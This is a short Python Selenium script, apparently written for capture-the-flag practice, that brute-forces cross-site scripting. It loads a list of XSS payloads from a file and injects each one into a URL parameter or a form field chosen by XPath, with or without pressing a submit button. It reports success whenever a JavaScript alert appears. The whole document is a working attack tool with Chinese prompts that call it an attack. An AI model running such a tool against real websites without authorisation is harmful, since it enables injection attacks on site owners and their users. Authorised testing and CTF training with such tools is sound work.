#!/usr/bin/env python3
#-*- coding:utf-8 -*-

from selenium import webdriver
import time
def get_xss(payload_url,sleep_time):
    browser.get(payload_url)
    time.sleep(sleep_time)

    try:
    #    browser.context()
        try:
            browser.switch_to_alert().text
            return True
        except:
            return False
    except:
        return False

def post_xss(url,xpth,payload,btn_xpth,sleep_time):
    browser.get(url)
    time.sleep(sleep_time)
    ele=browser.find_elements_by_xpath(xpth)[0]
    ele.send_keys(payload)
    browser.find_elements_by_xpath(btn_xpth)[0].click()
    time.sleep(sleep_time)
    try:
        try:
            browser.switch_to_alert().text
            return True
        except:
            return False
    except:
        return False

def intime_xss(url,xpth,payload,sleep_time):
    browser.get(url)
    time.sleep(sleep_time)
    ele=browser.find_elements_by_xpath(xpth)[0]
    ele.send_keys(payload)
    time.sleep(sleep_time)
    try:
        try:
            browser.switch_to_alert().text
            return True
        except:
            return False
    except:
        return False


def start(browser):
    global flag
    xss_method = input('请输入攻击的方式(网址(g)/填表发送(p)/填表(i)):')
    payloadlist = input('请输入攻击荷载：')
    sleep_time=float(input('请输入等待间隔(秒,推荐1):'))
    n = 0


    if xss_method == 'g':
        url = input('请输入GET网址，参数使用"value"：')

        with open(payloadlist) as f:
            for payload in f:
                n=n+1
                payload_url = url.replace('value',payload)
                print('正在测试%s中第%d个荷载:%s' % (payloadlist,n,payload))

                if get_xss(payload_url,sleep_time)==True:
                    print('攻击成功，payload为：'+payload)
                    jixu = input('还要继续吗?(y/n):')
                    if jixu == 'y':
                        continue
                    else:
                        break
                else:
                    continue
            flag = input('攻击结束，是否继续下一道题？（y/n）：')
    if xss_method == 'p':
        url = input('请输入网址：')
        xpth = input('请输入要写入payload的xpath：')
        btn_xpth = input('请输入发送按钮的xpath：')
        with open(payloadlist) as f:
            for payload in f:
                n=n+1
                print('正在测试%s中第%d个荷载:%s' % (payloadlist, n, payload))

                if post_xss(url,xpth,payload,btn_xpth,sleep_time):
                    print('攻击成功，payload为：'+payload)
                    jixu = input('还要继续吗?(y/n):')
                    if jixu =='y':
                        continue
                    else:
                        break
                else:
                    continue
            flag = input('攻击结束，是否继续下一道题？（y/n）：')
    if xss_method == 'i':
        url = input('请输入网址：')
        xpth = input('请输入要写入payload的xpath：')

        with open(payloadlist) as f:
            for payload in f:
                n=n+1
                print('正在测试%s中第%d个荷载:%s' % (payloadlist, n, payload))

                if intime_xss(url,xpth,payload,sleep_time):
                    print('攻击成功，payload为：'+payload)
                    jixu = input('还要继续吗?(y/n):')
                    if jixu =='y':
                        continue
                    else:
                        break
                else:
                    continue
            flag = input('攻击结束，是否继续下一道题？（y/n）：')

if __name__ == '__main__':
    flag = 'y'
    print("hijackxss暴力测试，作者：hijacklinux")
    browser = webdriver.Firefox(firefox_profile='/root/.mozilla/firefox/p1w4dwz4.default')
    while flag == 'y':
        start(browser)
    browser.quit()